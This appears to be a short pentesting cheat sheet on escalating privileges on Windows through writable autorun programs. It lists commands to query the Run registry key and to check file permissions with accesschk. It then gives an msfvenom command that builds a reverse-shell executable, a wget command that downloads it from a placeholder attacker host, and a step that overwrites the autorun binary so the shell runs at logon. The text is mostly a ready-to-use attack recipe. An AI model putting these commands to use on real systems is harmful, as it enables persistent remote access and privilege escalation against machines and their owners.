# Autoruns

Windows can be set to run scripts and applications on system boot and on logon of a user.

### 1) Check which programs are executed under this specific registry key

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

### 2) Check for access permissions on the program that is running inside the autorun registry

    .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

### 3) If you can overwrite the binary, then

##### Create Reverse Shell

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o program.exe

##### Upload to target system

    wget http://<Attacker-IP>/program.exe

##### Move to binary folder

    move .\program.exe "C:\Program Files\Autorun Program\" /Y

##### Wait for user to login
